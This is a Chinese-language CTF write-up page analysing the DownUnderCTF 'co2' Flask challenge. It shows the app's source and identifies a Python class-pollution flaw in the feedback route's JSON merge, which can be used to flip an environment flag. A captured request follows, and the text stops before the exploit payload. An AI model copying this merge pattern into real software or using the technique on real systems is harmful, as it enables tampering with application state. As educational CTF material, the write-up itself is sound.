<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>DownunderCTf复现 | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="webco2A group of students who don&#39;t like to do things the &quot;conventional&quot; way decided to come up with a CyberSecurity Blog post. You&#39;ve been hired to perform an in-depth whitebox test on their web appl">
<meta property="og:type" content="article">
<meta property="og:title" content="DownunderCTf复现">
<meta property="og:url" content="https://tao0845.github.io/posts/4cfd8fa8/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="webco2A group of students who don&#39;t like to do things the &quot;conventional&quot; way decided to come up with a CyberSecurity Blog post. You&#39;ve been hired to perform an in-depth whitebox test on their web appl">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/08/OP0BjK.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/08/OP0zeL.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/08/OP0hIX.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/08/OP07jj.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/09/OPc5Cc.png">
<meta property="article:published_time" content="2024-07-07T14:05:31.314Z">
<meta property="article:modified_time" content="2024-07-13T11:54:20.509Z">
<meta property="article:author" content="ta0">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/07/08/OP0BjK.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">94</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">147</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#co2"><span class="toc-number">1.1.</span> <span class="toc-text">co2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#co2v2"><span class="toc-number">2.</span> <span class="toc-text">co2v2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hah-got-em"><span class="toc-number">3.</span> <span class="toc-text">hah got em</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#i-am-confusion"><span class="toc-number">4.</span> <span class="toc-text">i am confusion</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/4cfd8fa8/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">DownunderCTf复现</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-07-07 22:05:31" itemprop="dateCreated datePublished" datetime="2024-07-07T22:05:31+08:00">2024-07-07</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-07-13 19:54:20" itemprop="dateModified" datetime="2024-07-13T19:54:20+08:00">2024-07-13</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">2.7k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">14m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="co2"><a href="#co2" class="headerlink" title="co2"></a>co2</h3><pre class="language-bash" data-language="bash"><code class="language-bash">A group of students <span class="token function">who</span> don<span class="token string">'t like to do things the "conventional" way decided to come up with a CyberSecurity Blog post. You'</span>ve been hired to perform an in-depth whitebox <span class="token builtin class-name">test</span> on their web application.</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/08/OP0BjK.png" alt="OP0BjK.png" loading="lazy"><br>正如描述所说是一个博客网站,看一下路由</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    posts <span class="token operator">=</span> BlogPost<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>is_public<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> posts<span class="token operator">=</span>posts<span class="token punctuation">)</span></code></pre>
<p>根目录正常index界面</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        hashed_password <span class="token operator">=</span> generate_password_hash<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'pbkdf2:sha256'</span><span class="token punctuation">)</span>
        new_user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> password<span class="token operator">=</span>hashed_password<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>new_user<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"register.html"</span><span class="token punctuation">)</span></code></pre>
<p>注册用户，密码使用<code>pbkdf2:sha256</code>哈希，注册成功重定向到登录界面</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">)</span>
    user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> user <span class="token keyword">and</span> check_password_hash<span class="token punctuation">(</span>user<span class="token punctuation">.</span>password<span class="token punctuation">,</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        login_user<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span></code></pre>
<p>登录界面，正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span></code></pre>
<p>退出路由，也正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/profile"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"profile.html"</span><span class="token punctuation">)</span></code></pre>
<p>profile正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">dashboard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    posts <span class="token operator">=</span> BlogPost<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>author<span class="token operator">=</span>current_user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"dashboard.html"</span><span class="token punctuation">,</span> posts<span class="token operator">=</span>posts<span class="token punctuation">)</span></code></pre>
<p>dashboard正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/blog/&lt;blog_id>"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">blog</span><span class="token punctuation">(</span>blog_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    post <span class="token operator">=</span> BlogPost<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>blog_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> post<span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span><span class="token string">"Blog post does not exist!"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"blog.html"</span><span class="token punctuation">,</span> post<span class="token operator">=</span>post<span class="token punctuation">)</span></code></pre>
<p>博客路由正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/edit/&lt;blog_id>"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">edit_blog_post</span><span class="token punctuation">(</span>blog_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    blog <span class="token operator">=</span> BlogPost<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span>blog_id<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        blog<span class="token punctuation">.</span>title <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span>
        blog<span class="token punctuation">.</span>content <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span>
        blog<span class="token punctuation">.</span>is_public <span class="token operator">=</span> <span class="token builtin">bool</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"public"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>blog<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/blog/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>blog<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> blog <span class="token keyword">and</span> current_user<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">==</span> blog<span class="token punctuation">.</span>author<span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"edit_blog.html"</span><span class="token punctuation">,</span> blog<span class="token operator">=</span>blog<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/403"</span><span class="token punctuation">)</span></code></pre>
<p>博客编辑，也正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/create_post"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">create_post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        post <span class="token operator">=</span> BlogPost<span class="token punctuation">(</span>title<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> content<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> author<span class="token operator">=</span>current_user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span>
        post<span class="token punctuation">.</span>is_public <span class="token operator">=</span> <span class="token builtin">bool</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"public"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>post<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"create_post.html"</span><span class="token punctuation">)</span></code></pre>
<p>创建文章，正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/changelog"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">changelog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"changelog.html"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/feedback"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">feedback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"feedback.html"</span><span class="token punctuation">)</span></code></pre>
<p>都没问题</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/save_feedback"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">save_feedback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
    feedback <span class="token operator">=</span> Feedback<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.</span>
    merge<span class="token punctuation">(</span>data<span class="token punctuation">,</span> feedback<span class="token punctuation">)</span>
    save_feedback_to_disk<span class="token punctuation">(</span>feedback<span class="token punctuation">)</span>
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"success"</span><span class="token punctuation">:</span> <span class="token string">"true"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span></code></pre>
<p>这个可能有问题，因为进行json解析,并且存在merge，可能存在类污染<br>解析request获取到的json数据，然后将解析到的数据合并到feedback中</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Feedback</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">""</span>
        self<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token string">""</span>
        self<span class="token punctuation">.</span>rating <span class="token operator">=</span> <span class="token string">""</span>
        self<span class="token punctuation">.</span>referred <span class="token operator">=</span> <span class="token string">""</span></code></pre>
<p>看一下获取flag的路由</p>
<pre class="language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/get_flag"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token string">"true"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"DUCTF&#123;NOT_THE_REAL_FLAG&#125;"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Nope"</span></code></pre>
<p>如果环境变量里面的flag,如果里面的flag值为true返回flag，那就很明显了，通过merge污染Feedback，进而污染环境变量<br>抓个包</p>
<pre class="language-none"><code class="language-none">POST &#x2F;save_feedback HTTP&#x2F;1.1
Host: 43.143.198.113:1337
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko&#x2F;20100101 Firefox&#x2F;127.0
Accept: *&#x2F;*
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
Referer: http:&#x2F;&#x2F;43.143.198.113:1337&#x2F;feedback
Content-Type: application&#x2F;json
Content-Length: 54
Origin: http:&#x2F;&#x2F;43.143.198.113:1337
Connection: close
Cookie: session&#x3D;.eJwljjEOAyEMwP7C3IGQhMB95kRIonblelPVvxepkxfL8iedsfx6puO9bn-k82XpSDgBSxi30cQyN-EpLAQmm5Q5fIqKl4oNwkNnrWrZgbCwK3QaTpJ7C4ZoTjQqFe0aXHvNCNCUyxwso--K4RzZjEW2k2kiYdoj9-Xrf1PS9weRQS69.ZouQPw.XhaKk65CdTp1wlBv4oa-aeHPf6U
Priority: u&#x3D;1

&#123;&quot;title&quot;:&quot;1&quot;,&quot;content&quot;:&quot;1&quot;,&quot;rating&quot;:&quot;1&quot;,&quot;referred&quot;:&quot;&quot;&#125;</code></pre>
<p>将post的数据改成</p>
